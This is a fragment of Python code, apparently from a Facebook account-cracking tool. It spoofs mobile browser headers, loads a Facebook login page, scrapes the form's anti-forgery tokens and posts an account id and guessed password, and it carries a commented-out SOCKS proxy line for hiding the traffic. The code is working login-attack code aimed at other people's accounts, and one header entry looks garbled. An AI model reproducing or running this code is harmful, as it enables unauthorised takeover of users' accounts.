...
#			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F1501092823525282%2F%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin.php%253Fskip_api_login%253D1%2526api_key%253D124024574287414%2526kid_directed_site%253D0%2526app_id%253D124024574287414%2526signed_next%253D1%2526next%253Dhttps%25253A%25252F%25252Fm.facebook.com%25252Fdialog%25252Foauth%25253Fclient_id%25253D124024574287414%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Fwww.instagram.com%2525252Faccounts%2525252Fsignup%2525252F%252526state%25253D%2525257B%25252522fbLoginKey%25252522%2525253A%252525221aa3v1lbsy30g1r1dnem4sh7vakn1wsv1rsaban14imwcu6ej9k7%25252522%2525252C%25252522fbLoginReturnURL%25252522%2525253A%25252522%2525252Ffxcal%2525252Fdisclosure%2525252F%2525253Fnext%2525253D%252525252F%25252522%2525257D%252526scope%25253Demail%252526response_type%25253Dcode%2525252Cgranted_scopes%252526locale%25253Did_ID%252526ret%25253Dlogin%252526fbapp_pres%25253D0%252526logger_id%25253D71ddeeab-3309-4e30-a121-dcbc84be8354%252526tp%25253Dunspecified%2526cancel_url%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fsignup%25252F%25253Ferror%25253Daccess_denied%252526error_code%25253D200%252526error_description%25253DPermissions%25252Berror%252526error_reason%25253Duser_denied%252526state%25253D%2525257B%25252522fbLoginKey%25252522%2525253A%252525221aa3v1lbsy30g1r1dnem4sh7vakn1wsv1rsaban14imwcu6ej9k7%25252522%2525252C%25252522fbLoginReturnURL%25252522%2525253A%25252522%2525252Ffxcal%2525252Fdisclosure%2525252F%2525253Fnext%2525253D%252525252F%25252522%2525257D%252523_%25253D_%2526display%253Dpage%2526locale%253Did_ID%2526pl_dbl%253D0")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&lwv=100": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
